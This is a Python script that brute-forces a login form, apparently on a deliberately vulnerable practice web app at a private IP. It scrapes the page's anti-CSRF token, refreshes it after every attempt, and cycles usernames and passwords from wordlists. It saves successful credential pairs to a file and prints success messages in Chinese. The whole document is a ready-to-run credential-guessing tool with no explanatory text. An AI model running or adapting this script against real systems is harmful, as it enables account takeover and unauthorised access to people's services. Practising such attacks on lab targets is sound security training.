import requests
from bs4 import BeautifulSoup

host = '192.168.152.130:8089'
url = 'http://%s/vul/burteforce/bf_token.php' % (host)
headers = {
    'Host': host,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36',
    'Referer': url,
    'Cookie': 'BEEFHOOK=1; lang=zh-cn; theme=default; PHPSESSID=2',
    'Connection': 'close'
}

response = requests.get(url, headers=headers)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find('input', {'name': 'token'})
    if token_input:
        token_value = token_input['value']
        print(f"Token value: {token_value}")
    else:
        print("Token input element not found")
else:
    print("GET request failed")

username_file_path = 'E:\\user.txt'
password_file_path = 'E:\\Top50.txt'
with open(username_file_path, 'r') as file:
    usernames = file.readlines()
for username in usernames:
    username = username.strip()
    with open(password_file_path, 'r') as file:
        passwords = file.readlines()  # Remove leading/trailing whitespace or newline characters
    for password in passwords:
        password = password.strip()
        data = {
            'username': username,
            'password': password,
            'token': token_value,
            'submit': 'Login'
        }
        response = requests.post(url, headers=headers, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': 'token'})
        if token_input:
            token_value = token_input['value']
            print(f"Token value: {token_value}")
        else:
            print("Token input element not found")
        print(f"username: {username}")
        print(f"Password: {password}")

        if 'username or password is not exists' in response.text:  # assert
            print("密码破解不正确")
        elif 'login success' in response.text:
            print("恭喜！！密码破解正确")
            with open('OK.txt', 'a+', encoding='utf8') as f:
                f.writelines('账号：%s，密码：%s，Token：%s\n' % (username, password, token_value))
                f.close()
            break
        else:
            print("Unexpected response")

    print("--------------")
